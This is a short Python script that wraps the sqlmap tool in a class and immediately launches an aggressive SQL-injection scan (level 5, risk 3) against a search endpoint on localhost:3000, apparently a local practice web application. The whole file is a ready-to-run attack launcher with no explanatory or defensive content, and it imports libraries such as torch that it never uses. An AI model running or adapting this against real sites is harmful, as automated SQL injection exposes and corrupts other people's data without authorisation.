import torch
import torch.nn as nn
from random_string_generator import RandomStringGenerator
import logging
import subprocess
import os


class SQLInjectionAttack:
    def sqlmap_attack(self, target_url, level=1, risk=1):
        logging.info("Attacking %s with SQLMap...", target_url)
        path_to_executable = os.path.join(os.path.dirname(__file__), "sqlmap/sqlmap.py")
        command = [
            "python3",
            path_to_executable,
            "-u",
            target_url,
            "--batch",
            "--level",
            str(level),
            "--risk",
            str(risk),
        ]
        subprocess.run(command)


# Create SQLInjectionAttack object
sql_injection_attack = SQLInjectionAttack()

# SQLMap attack parameters
target_url_sqlmap = "http://localhost:3000/rest/products/search?q="
level = 5
risk = 3

# Launch SQLMap attack
sql_injection_attack.sqlmap_attack(target_url_sqlmap, level, risk)
